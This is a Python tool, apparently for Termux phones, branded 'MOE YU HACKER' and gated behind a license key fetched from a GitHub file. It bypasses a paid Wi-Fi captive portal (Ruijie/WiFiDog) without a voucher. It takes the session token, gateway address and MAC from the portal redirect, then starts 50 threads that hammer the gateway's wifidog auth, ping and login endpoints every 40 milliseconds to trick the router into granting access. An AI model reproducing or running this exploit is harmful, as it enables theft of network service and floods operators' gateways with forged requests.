import requests
import urllib3
import time
import threading
import random
import sys
import os
import uuid
import socket
from urllib.parse import urlparse, parse_qs
from rich.console import Console
from rich.panel import Panel
from rich.align import Align

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# User Summary အရ သိရှိထားသော User ၏ Repository
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

# ANSI COLORS FOR TERMUX
G = "\033[1;92m" 
C = "\033[1;96m" 
R = "\033[1;91m" 
Y = "\033[1;93m" 
W = "\033[0m"

BANNER = """[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      M O E   Y U   H A C K E R
[/]"""

def check_license():
    console.clear()
    console.print(Align.center(BANNER))
    # User ပြသထားသော ပုံပါ HWID အတိုင်း သတ်မှတ်ပေးထားသည်
    console.print(Align.center(Panel(f"HWID: [yellow]KEY-90AE3B7FB9[/]", title="[red]SECURITY[/]", expand=False)))
    try:
        user_key = input(f"\n  {W}[KEY] @MoeYu_").strip()
        if not user_key: sys.exit()
        res = requests.get(KEY_URL, timeout=10).text
        if user_key in res:
            console.print(f"{G}>>> ACCESS GRANTED! {W}")
            return True
        sys.exit(f"{R}INVALID KEY! {W}")
    except: sys.exit(f"{R}CONNECTION ERROR! {W}")

# ===============================
# ULTIMATE FORCE BYPASS ENGINE (v21.0)
# ===============================

def start_bypass_process():
    console.print(Panel(Align.center("[bold white]🔥 MOE YU VOUCHER-LESS BYPASS (FORCE ACTIVATE) 🔥[/bold white]"), border_style="red", expand=False))
    
    # Persistent Session Setup
    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=10)
    session.mount('http://', adapter)
    
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    })

    while True:
        try:
            # Step 1: Connectivity Check (Bypass ဖြစ်မဖြစ် စစ်ခြင်း)
            check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if check.status_code == 204 and "ruijie" not in check.url:
                sys.stdout.write(f"\r{G}[✓] STATUS: BYPASS STABLE | ENJOY INTERNET! ✅ {W}")
                sys.stdout.flush()
                time.sleep(10)
                continue

            # Step 2: Extraction of Redirect URL Parameters
            portal_url = check.url
            parsed = urlparse(portal_url)
            query = parse_qs(parsed.query)
            
            # Voucher Token & Gateway Info
            sid = (query.get('token', [None])[0] or query.get('chap_challenge', [None])[0])
            gw_ip = query.get('gw_address', ['192.168.110.1'])[0]
            gw_port = query.get('gw_port', ['2060'])[0]
            mac = query.get('mac', [''])[0]

            if sid:
                # Bypass Endpoints Construction
                targets = [
                    f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}&mac={mac}",
                    f"http://{gw_ip}:{gw_port}/wifidog/ping?token={sid}",
                    f"http://{gw_ip}:{gw_port}/wifidog/login?token={sid}&state=1"
                ]

                def turbo_pulse():
                    while True:
                        try:
                            # တစ်ချိန်တည်းတွင် Request အမြောက်အမြားပို့၍ Router ကို လှည့်စားခြင်း
                            for url in targets:
                                session.get(url, timeout=3)
                            sys.stdout.write(f"\r{C}[!] Pulse: {gw_ip} | SID: {sid[:12]}... | Status: Injecting... {W}")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.04) # Extreme Speed

                # 50 Threads ဖြင့် အရှိန်အဟုန်မြှင့် လုပ်ဆောင်ခြင်း
                for _ in range(50):
                    threading.Thread(target=turbo_pulse, daemon=True).start()

                console.print(f"\n{Y}[!] Deep Injection Active. Now open Browser and click 'Login' on Voucher Page!{W}")
                
                # Stability Check Loop
                while True:
                    time.sleep(15)
                    try:
                        # အင်တာနက် ရမရ ပြန်စစ်ခြင်း
                        if requests.get("http://www.google.com", timeout=5).status_code == 200:
                            time.sleep(5)
                        else: break
                    except: break
            else:
                sys.stdout.write(f"\r{R}[×] No Token Captured. Please open Login Page in Browser once.{W}")
                sys.stdout.flush()
                time.sleep(3)

        except Exception:
            time.sleep(5)

if __name__ == "__main__":
    try:
        if check_license():
            start_bypass_process()
    except KeyboardInterrupt:
        console.print(f"\n{R}[!] Script Stopped by User.{W}")
        sys.exit()
